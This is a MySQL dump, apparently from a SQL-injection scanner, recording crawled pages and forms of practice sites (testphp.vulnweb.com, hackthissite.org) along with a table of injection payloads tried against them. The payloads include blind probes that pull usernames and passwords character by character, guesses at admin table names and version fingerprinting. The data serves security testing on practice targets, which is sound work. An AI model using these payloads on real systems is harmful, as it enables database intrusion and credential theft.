-- phpMyAdmin SQL Dump
-- version 4.8.4
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1:3306
-- Generation Time: Aug 08, 2019 at 04:16 PM
-- Server version: 5.7.24
-- PHP Version: 7.2.14

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `crawlerdb`
--

-- --------------------------------------------------------

--
-- Table structure for table `forms`
--

DROP TABLE IF EXISTS `forms`;
CREATE TABLE IF NOT EXISTS `forms` (
  `id_form` int(200) NOT NULL AUTO_INCREMENT,
  `id_url` int(200) NOT NULL,
  `action` varchar(200) NOT NULL,
  `method` varchar(200) NOT NULL,
  `id` varchar(200) NOT NULL,
  PRIMARY KEY (`id_form`),
  KEY `id_url` (`id_url`)
) ENGINE=InnoDB AUTO_INCREMENT=17691 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `forms`
--

INSERT INTO `forms` (`id_form`, `id_url`, `action`, `method`, `id`) VALUES
(17645, 12742, 'search.php?test=query', 'post', ''),
(17646, 12743, 'search.php?test=query', 'post', ''),
(17647, 12744, 'search.php?test=query', 'post', ''),
(17648, 12745, 'search.php?test=query', 'post', ''),
(17649, 12746, 'search.php?test=query', 'post', ''),
(17650, 12747, '', 'post', ''),
(17651, 12747, 'search.php?test=query', 'post', ''),
(17652, 12749, 'userinfo.php', 'post', ''),
(17653, 12749, 'search.php?test=query', 'post', ''),
(17654, 12750, 'userinfo.php', 'post', ''),
(17655, 12750, 'search.php?test=query', 'post', ''),
(17656, 12754, 'search.php?test=query', 'post', ''),
(17657, 12755, 'search.php?test=query', 'post', ''),
(17658, 12756, 'search.php?test=query', 'post', ''),
(17659, 12757, 'search.php?test=query', 'post', ''),
(17660, 12758, 'search.php?test=query', 'post', ''),
(17661, 12759, 'search.php?test=query', 'post', ''),
(17662, 12760, 'search.php?test=query', 'post', ''),
(17663, 12761, 'search.php?test=query', 'post', ''),
(17664, 12762, '/secured/newuser.php', 'post', ''),
(17665, 12762, 'search.php?test=query', 'post', ''),
(17666, 12763, 'params.php?p=valid&pp=12', '', ''),
(17667, 12764, 'cart.php', 'POST', ''),
(17668, 12764, 'search.php?test=query', 'post', ''),
(17669, 12766, 'search.php?test=query', 'post', ''),
(17670, 12767, 'cart.php', 'POST', ''),
(17671, 12767, 'search.php?test=query', 'post', ''),
(17672, 12769, 'cart.php', 'POST', ''),
(17673, 12769, 'search.php?test=query', 'post', ''),
(17674, 12771, 'cart.php', 'POST', ''),
(17675, 12771, 'search.php?test=query', 'post', ''),
(17676, 12773, 'cart.php', 'POST', ''),
(17677, 12773, 'search.php?test=query', 'post', ''),
(17678, 12775, 'cart.php', 'POST', ''),
(17679, 12775, 'search.php?test=query', 'post', ''),
(17680, 12777, 'cart.php', 'POST', ''),
(17681, 12777, 'search.php?test=query', 'post', ''),
(17682, 12779, 'search.php?test=query', 'post', ''),
(17683, 12780, 'search.php?test=query', 'post', ''),
(17684, 12781, 'search.php?test=query', 'post', ''),
(17685, 12782, 'search.php?test=query', 'post', ''),
(17686, 12783, 'search.php?test=query', 'post', ''),
(17687, 12784, 'search.php?test=query', 'post', ''),
(17688, 12785, 'search.php?test=query', 'post', ''),
(17689, 12787, 'search.php?test=query', 'post', ''),
(17690, 12788, 'search.php?test=query', 'post', '');

-- --------------------------------------------------------

--
-- Table structure for table `inputs`
--

DROP TABLE IF EXISTS `inputs`;
CREATE TABLE IF NOT EXISTS `inputs` (
  `id_input` int(200) NOT NULL AUTO_INCREMENT,
  `type` varchar(200) NOT NULL,
  `name` varchar(200) NOT NULL,
  `class` varchar(200) NOT NULL,
  `id_form` int(200) NOT NULL,
  `value` varchar(1000) DEFAULT NULL,
  `id` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id_input`),
  KEY `id_form` (`id_form`)
) ENGINE=MyISAM AUTO_INCREMENT=67005 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `inputs`
--

INSERT INTO `inputs` (`id_input`, `type`, `name`, `class`, `id_form`, `value`, `id`) VALUES
(66897, 'text', 'searchFor', '', 17645, '', NULL),
(66898, 'submit', 'goButton', '', 17645, 'go', NULL),
(66899, 'text', 'searchFor', '', 17646, '', NULL),
(66900, 'submit', 'goButton', '', 17646, 'go', NULL),
(66901, 'text', 'searchFor', '', 17647, '', NULL),
(66902, 'submit', 'goButton', '', 17647, 'go', NULL),
(66903, 'text', 'searchFor', '', 17648, '', NULL),
(66904, 'submit', 'goButton', '', 17648, 'go', NULL),
(66905, 'text', 'searchFor', '', 17649, '', NULL),
(66906, 'submit', 'goButton', '', 17649, 'go', NULL),
(66907, 'hidden', 'name', '', 17650, 'anonymous user', NULL),
(66908, 'textarea', 'text', '', 17650, '', NULL),
(66909, 'submit', 'submit', '', 17650, 'add message', NULL),
(66910, 'text', 'searchFor', '', 17651, '', NULL),
(66911, 'submit', 'goButton', '', 17651, 'go', NULL),
(66912, 'text', 'uname', '', 17652, '', NULL),
(66913, 'password', 'pass', '', 17652, '', NULL),
(66914, 'submit', '', '', 17652, 'login', NULL),
(66915, 'text', 'searchFor', '', 17653, '', NULL),
(66916, 'submit', 'goButton', '', 17653, 'go', NULL),
(66917, 'text', 'uname', '', 17654, '', NULL),
(66918, 'password', 'pass', '', 17654, '', NULL),
(66919, 'submit', '', '', 17654, 'login', NULL),
(66920, 'text', 'searchFor', '', 17655, '', NULL),
(66921, 'submit', 'goButton', '', 17655, 'go', NULL),
(66922, 'text', 'searchFor', '', 17656, '', NULL),
(66923, 'submit', 'goButton', '', 17656, 'go', NULL),
(66924, 'text', 'searchFor', '', 17657, '', NULL),
(66925, 'submit', 'goButton', '', 17657, 'go', NULL),
(66926, 'text', 'searchFor', '', 17658, '', NULL),
(66927, 'submit', 'goButton', '', 17658, 'go', NULL),
(66928, 'text', 'searchFor', '', 17659, '', NULL),
(66929, 'submit', 'goButton', '', 17659, 'go', NULL),
(66930, 'text', 'searchFor', '', 17660, '', NULL),
(66931, 'submit', 'goButton', '', 17660, 'go', NULL),
(66932, 'text', 'searchFor', '', 17661, '', NULL),
(66933, 'submit', 'goButton', '', 17661, 'go', NULL),
(66934, 'text', 'searchFor', '', 17662, '', NULL),
(66935, 'submit', 'goButton', '', 17662, 'go', NULL),
(66936, 'text', 'searchFor', '', 17663, '', NULL),
(66937, 'submit', 'goButton', '', 17663, 'go', NULL),
(66938, 'text', 'uuname', '', 17664, '', NULL),
(66939, 'password', 'upass', '', 17664, '', NULL),
(66940, 'password', 'upass2', '', 17664, '', NULL),
(66941, 'text', 'urname', '', 17664, '', NULL),
(66942, 'text', 'ucc', '', 17664, '', NULL),
(66943, 'text', 'uemail', '', 17664, '', NULL),
(66944, 'text', 'uphone', '', 17664, '', NULL),
(66945, 'textarea', 'uaddress', '', 17664, '', NULL),
(66946, 'submit', 'signup', '', 17664, 'signup', NULL),
(66947, 'text', 'searchFor', '', 17665, '', NULL),
(66948, 'submit', 'goButton', '', 17665, 'go', NULL),
(66949, 'submit', 'aaaa/', '', 17666, '', NULL),
(66950, 'hidden', 'price', '', 17667, '500', NULL),
(66951, 'hidden', 'addcart', '', 17667, '1', NULL),
(66952, 'submit', '', '', 17667, 'add this picture to cart', NULL),
(66953, 'text', 'searchFor', '', 17668, '', NULL),
(66954, 'submit', 'goButton', '', 17668, 'go', NULL),
(66955, 'text', 'searchFor', '', 17669, '', NULL),
(66956, 'submit', 'goButton', '', 17669, 'go', NULL),
(66957, 'hidden', 'price', '', 17670, '800', NULL),
(66958, 'hidden', 'addcart', '', 17670, '2', NULL),
(66959, 'submit', '', '', 17670, 'add this picture to cart', NULL),
(66960, 'text', 'searchFor', '', 17671, '', NULL),
(66961, 'submit', 'goButton', '', 17671, 'go', NULL),
(66962, 'hidden', 'price', '', 17672, '986', NULL),
(66963, 'hidden', 'addcart', '', 17672, '3', NULL),
(66964, 'submit', '', '', 17672, 'add this picture to cart', NULL),
(66965, 'text', 'searchFor', '', 17673, '', NULL),
(66966, 'submit', 'goButton', '', 17673, 'go', NULL),
(66967, 'hidden', 'price', '', 17674, '1000', NULL),
(66968, 'hidden', 'addcart', '', 17674, '4', NULL),
(66969, 'submit', '', '', 17674, 'add this picture to cart', NULL),
(66970, 'text', 'searchFor', '', 17675, '', NULL),
(66971, 'submit', 'goButton', '', 17675, 'go', NULL),
(66972, 'hidden', 'price', '', 17676, '460', NULL),
(66973, 'hidden', 'addcart', '', 17676, '5', NULL),
(66974, 'submit', '', '', 17676, 'add this picture to cart', NULL),
(66975, 'text', 'searchFor', '', 17677, '', NULL),
(66976, 'submit', 'goButton', '', 17677, 'go', NULL),
(66977, 'hidden', 'price', '', 17678, '15000', NULL),
(66978, 'hidden', 'addcart', '', 17678, '7', NULL),
(66979, 'submit', '', '', 17678, 'add this picture to cart', NULL),
(66980, 'text', 'searchFor', '', 17679, '', NULL),
(66981, 'submit', 'goButton', '', 17679, 'go', NULL),
(66982, 'hidden', 'price', '', 17680, '10000', NULL),
(66983, 'hidden', 'addcart', '', 17680, '6', NULL),
(66984, 'submit', '', '', 17680, 'add this picture to cart', NULL),
(66985, 'text', 'searchFor', '', 17681, '', NULL),
(66986, 'submit', 'goButton', '', 17681, 'go', NULL),
(66987, 'text', 'searchFor', '', 17682, '', NULL),
(66988, 'submit', 'goButton', '', 17682, 'go', NULL),
(66989, 'text', 'searchFor', '', 17683, '', NULL),
(66990, 'submit', 'goButton', '', 17683, 'go', NULL),
(66991, 'text', 'searchFor', '', 17684, '', NULL),
(66992, 'submit', 'goButton', '', 17684, 'go', NULL),
(66993, 'text', 'searchFor', '', 17685, '', NULL),
(66994, 'submit', 'goButton', '', 17685, 'go', NULL),
(66995, 'text', 'searchFor', '', 17686, '', NULL),
(66996, 'submit', 'goButton', '', 17686, 'go', NULL),
(66997, 'text', 'searchFor', '', 17687, '', NULL),
(66998, 'submit', 'goButton', '', 17687, 'go', NULL),
(66999, 'text', 'searchFor', '', 17688, '', NULL),
(67000, 'submit', 'goButton', '', 17688, 'go', NULL),
(67001, 'text', 'searchFor', '', 17689, '', NULL),
(67002, 'submit', 'goButton', '', 17689, 'go', NULL),
(67003, 'text', 'searchFor', '', 17690, '', NULL),
(67004, 'submit', 'goButton', '', 17690, 'go', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `search_table`
--

DROP TABLE IF EXISTS `search_table`;
CREATE TABLE IF NOT EXISTS `search_table` (
  `id_search` int(11) NOT NULL AUTO_INCREMENT,
  `search_input` varchar(300) NOT NULL,
  `search_form` varchar(300) DEFAULT NULL,
  `search_vul` tinyint(1) NOT NULL,
  `search_url` varchar(300) NOT NULL,
  PRIMARY KEY (`id_search`)
) ENGINE=MyISAM AUTO_INCREMENT=183 DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `urls`
--

DROP TABLE IF EXISTS `urls`;
CREATE TABLE IF NOT EXISTS `urls` (
  `id_url` int(200) NOT NULL AUTO_INCREMENT,
  `url` varchar(1000) NOT NULL,
  `id_site` int(200) NOT NULL,
  PRIMARY KEY (`id_url`),
  KEY `id_site` (`id_site`)
) ENGINE=InnoDB AUTO_INCREMENT=12789 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `urls`
--

INSERT INTO `urls` (`id_url`, `url`, `id_site`) VALUES
(12742, 'http://testphp.vulnweb.com/index.php', 421),
(12743, 'http://testphp.vulnweb.com/categories.php', 421),
(12744, 'http://testphp.vulnweb.com/artists.php', 421),
(12745, 'http://testphp.vulnweb.com/disclaimer.php', 421),
(12746, 'http://testphp.vulnweb.com/cart.php', 421),
(12747, 'http://testphp.vulnweb.com/guestbook.php', 421),
(12748, 'http://testphp.vulnweb.com/ajax/index.php', 421),
(12749, 'http://testphp.vulnweb.com/login.php', 421),
(12750, 'http://testphp.vulnweb.com/userinfo.php', 421),
(12751, 'http://testphp.vulnweb.com/privacy.php', 421),
(12752, 'http://testphp.vulnweb.com/mod_rewrite_shop/', 421),
(12753, 'http://testphp.vulnweb.com/hpp/', 421),
(12754, 'http://testphp.vulnweb.com/listproducts.php?cat=1', 421),
(12755, 'http://testphp.vulnweb.com/listproducts.php?cat=2', 421),
(12756, 'http://testphp.vulnweb.com/listproducts.php?cat=3', 421),
(12757, 'http://testphp.vulnweb.com/listproducts.php?cat=4', 421),
(12758, 'http://testphp.vulnweb.com/artists.php?artist=1', 421),
(12759, 'http://testphp.vulnweb.com/artists.php#', 421),
(12760, 'http://testphp.vulnweb.com/artists.php?artist=2', 421),
(12761, 'http://testphp.vulnweb.com/artists.php?artist=3', 421),
(12762, 'http://testphp.vulnweb.com/signup.php', 421),
(12763, 'http://testphp.vulnweb.com/hpp/?pp=12', 421),
(12764, 'http://testphp.vulnweb.com/product.php?pic=1', 421),
(12765, 'http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg', 421),
(12766, 'http://testphp.vulnweb.com/listproducts.php?cat=1#', 421),
(12767, 'http://testphp.vulnweb.com/product.php?pic=2', 421),
(12768, 'http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg', 421),
(12769, 'http://testphp.vulnweb.com/product.php?pic=3', 421),
(12770, 'http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg', 421),
(12771, 'http://testphp.vulnweb.com/product.php?pic=4', 421),
(12772, 'http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg', 421),
(12773, 'http://testphp.vulnweb.com/product.php?pic=5', 421),
(12774, 'http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg', 421),
(12775, 'http://testphp.vulnweb.com/product.php?pic=7', 421),
(12776, 'http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg', 421),
(12777, 'http://testphp.vulnweb.com/product.php?pic=6', 421),
(12778, 'http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg', 421),
(12779, 'http://testphp.vulnweb.com/listproducts.php?cat=2#', 421),
(12780, 'http://testphp.vulnweb.com/listproducts.php?artist=1', 421),
(12781, 'http://testphp.vulnweb.com/artists.php?artist=1#', 421),
(12782, 'http://testphp.vulnweb.com/listproducts.php?artist=2', 421),
(12783, 'http://testphp.vulnweb.com/artists.php?artist=2#', 421),
(12784, 'http://testphp.vulnweb.com/listproducts.php?artist=3', 421),
(12785, 'http://testphp.vulnweb.com/artists.php?artist=3#', 421),
(12786, 'http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12', 421),
(12787, 'http://testphp.vulnweb.com/listproducts.php?artist=1#', 421),
(12788, 'http://testphp.vulnweb.com/listproducts.php?artist=2#', 421);

-- --------------------------------------------------------

--
-- Table structure for table `vulnerability`
--

DROP TABLE IF EXISTS `vulnerability`;
CREATE TABLE IF NOT EXISTS `vulnerability` (
  `id_vul` int(200) NOT NULL AUTO_INCREMENT,
  `url_vul` varchar(200) NOT NULL,
  `input_vul` varchar(200) DEFAULT NULL,
  `payload_vul` varchar(200) NOT NULL,
  `similarity` double DEFAULT NULL,
  `error_based` varchar(200) DEFAULT NULL,
  `status_code` int(200) DEFAULT NULL,
  `blind_based` tinyint(1) DEFAULT NULL,
  `tautology_based` tinyint(1) DEFAULT NULL,
  PRIMARY KEY (`id_vul`)
) ENGINE=MyISAM AUTO_INCREMENT=2887 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `vulnerability`
--

INSERT INTO `vulnerability` (`id_vul`, `url_vul`, `input_vul`, `payload_vul`, `similarity`, `error_based`, `status_code`, `blind_based`, `tautology_based`) VALUES
(2838, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\'', 99.7, NULL, NULL, NULL, NULL),
(2839, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' and (SELECT substring(concat(1,password),1,1) from user limit 0,1)=2--+', NULL, NULL, NULL, 0, NULL),
(2840, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' or (SELECT substring(concat(1,login),1,1) from Administrator limit 0,1)=2--+', NULL, NULL, NULL, 0, NULL),
(2841, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' or (SELECT substring(concat(1,<insert-column-guess-here>),1,1) from <table-name> limit 0,1)=2--+', NULL, NULL, NULL, 0, NULL),
(2842, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' or ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>500--+', NULL, NULL, NULL, 0, NULL),
(2843, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '/**/GROUP/**/BY/**/2--', NULL, NULL, NULL, 0, NULL),
(2844, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\'+GROUP+BY+2--+', NULL, NULL, NULL, 0, NULL),
(2845, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, ' and (SELECT 1 from tbl_admin limit 0,1)=2--', NULL, NULL, NULL, 0, NULL),
(2846, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, ' and (SELECT 1 from users limit 0,1)=2--', NULL, NULL, NULL, 0, NULL),
(2847, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, ' and (SELECT 1 from TableName limit 0,1)=2--', NULL, NULL, NULL, 0, NULL),
(2848, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, ' or substring(@@version,1,1)=4--', NULL, NULL, NULL, 0, NULL),
(2849, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, ' or (SELECT 1 from tblAdmin limit 0,1)=2--', NULL, NULL, NULL, 0, NULL),
(2850, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, ' or (SELECT 1 from user limit 0,1)=2--', NULL, NULL, NULL, 0, NULL),
(2851, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\'', 99.6, NULL, NULL, NULL, NULL),
(2852, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' and 5050=5051--+', NULL, NULL, NULL, 0, NULL),
(2853, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' and (SELECT 1 from admin limit 0,1)=2--+', NULL, NULL, NULL, 0, NULL),
(2854, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' and (SELECT 1 from users limit 0,1)=2--+', NULL, NULL, NULL, 0, NULL),
(2855, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' and (SELECT substring(concat(1,ID),1,1) from admin limit 0,1)=2--+', NULL, NULL, NULL, 0, NULL),
(2856, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' or substring(@@version,1,1)=5--+', NULL, NULL, NULL, 0, NULL),
(2857, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' or (SELECT 1 from admin limit 0,1)=2--+', NULL, NULL, NULL, 0, NULL),
(2858, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' or (SELECT 1 from tbl_admin limit 0,1)=2--+', NULL, NULL, NULL, 0, NULL),
(2859, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' or (SELECT 1 from TableName limit 0,1)=2--+', NULL, NULL, NULL, 0, NULL),
(2860, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' or (SELECT substring(concat(1,login),1,1) from Administrator limit 0,1)=2--+', NULL, NULL, NULL, 0, NULL),
(2861, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '/**/GROUP/**/BY/**/2--', NULL, NULL, NULL, 0, NULL),
(2862, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' GROUP BY 2-- ', NULL, NULL, NULL, 0, NULL),
(2863, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '+union+select+2--', NULL, NULL, NULL, 0, NULL),
(2864, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, ' and (SELECT 1 from admin limit 0,1)=2--', NULL, NULL, NULL, 0, NULL),
(2865, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, ' and (SELECT 1 from TableName limit 0,1)=2--', NULL, NULL, NULL, 0, NULL),
(2866, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, ' and (SELECT substring(concat(1,login),1,1) from Administrator limit 0,1)=2--', NULL, NULL, NULL, 0, NULL),
(2867, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, ' or substring(@@version,1,1)=4--', NULL, NULL, NULL, 0, NULL),
(2868, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, ' or (SELECT 1 from tblAdmin limit 0,1)=2--', NULL, NULL, NULL, 0, NULL),
(2869, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, ' or ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>500--', NULL, NULL, NULL, 0, NULL),
(2870, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\'', 99.5, NULL, NULL, NULL, NULL),
(2871, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '/**/and/**/1=2', NULL, NULL, NULL, 0, NULL),
(2872, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' and (SELECT 1 from users limit 0,1)=2--+', NULL, NULL, NULL, 0, NULL),
(2873, 'https://www.hackthissite.org/missions/realistic/4/products.php?category=', NULL, '\' or 5050=5051--+', NULL, NULL, NULL, 0, NULL),
(2874, 'http://testphp.vulnweb.com/listproducts.php?cat=1', NULL, '\'', NULL, 'check the manual that corresponds to your MySQL server version for the right syntax ', NULL, NULL, NULL),
(2875, 'http://testphp.vulnweb.com/listproducts.php?cat=1', NULL, '/**/and/**/1=2', NULL, NULL, NULL, 1, NULL),
(2876, 'http://testphp.vulnweb.com/listproducts.php?cat=2', NULL, '\'', NULL, 'check the manual that corresponds to your MySQL server version for the right syntax ', NULL, NULL, NULL),
(2877, 'http://testphp.vulnweb.com/listproducts.php?cat=2', NULL, '/**/and/**/1=2', NULL, NULL, NULL, 1, NULL),
(2878, 'http://testphp.vulnweb.com/listproducts.php?cat=3', NULL, '\'', NULL, 'check the manual that corresponds to your MySQL server version for the right syntax ', NULL, NULL, NULL),
(2879, 'http://testphp.vulnweb.com/listproducts.php?cat=1', NULL, '\'', NULL, 'check the manual that corresponds to your MySQL server version for the right syntax ', NULL, NULL, NULL),
(2880, 'http://testphp.vulnweb.com/listproducts.php?cat=1', NULL, '/**/and/**/1=2', NULL, NULL, NULL, 1, NULL),
(2881, 'http://testphp.vulnweb.com/listproducts.php?cat=2', NULL, '\'', NULL, 'check the manual that corresponds to your MySQL server version for the right syntax ', NULL, NULL, NULL),
(2882, 'http://testphp.vulnweb.com/listproducts.php?cat=2', NULL, '/**/and/**/1=2', NULL, NULL, NULL, 1, NULL),
(2883, 'http://testphp.vulnweb.com/listproducts.php?cat=3', NULL, '\'', NULL, 'check the manual that corresponds to your MySQL server version for the right syntax ', NULL, NULL, NULL),
(2885, 'http://testphp.vulnweb.com/signup.php', 'uuname', '\'', NULL, 'check the manual that corresponds to your MySQL server version for the right syntax ', NULL, NULL, NULL),
(2886, 'http://testphp.vulnweb.com/signup.php', 'uuname', '\'', NULL, 'check the manual that corresponds to your MySQL server version for the right syntax ', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `websites`
--

DROP TABLE IF EXISTS `websites`;
CREATE TABLE IF NOT EXISTS `websites` (
  `id_site` int(200) NOT NULL AUTO_INCREMENT,
  `site` varchar(1000) NOT NULL,
  PRIMARY KEY (`id_site`)
) ENGINE=InnoDB AUTO_INCREMENT=422 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `websites`
--

INSERT INTO `websites` (`id_site`, `site`) VALUES
(421, 'http://testphp.vulnweb.com/index.php');

--
-- Constraints for dumped tables
--

--
-- Constraints for table `forms`
--
ALTER TABLE `forms`
  ADD CONSTRAINT `forms_ibfk_1` FOREIGN KEY (`id_url`) REFERENCES `urls` (`id_url`);

--
-- Constraints for table `urls`
--
ALTER TABLE `urls`
  ADD CONSTRAINT `urls_ibfk_1` FOREIGN KEY (`id_site`) REFERENCES `websites` (`id_site`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
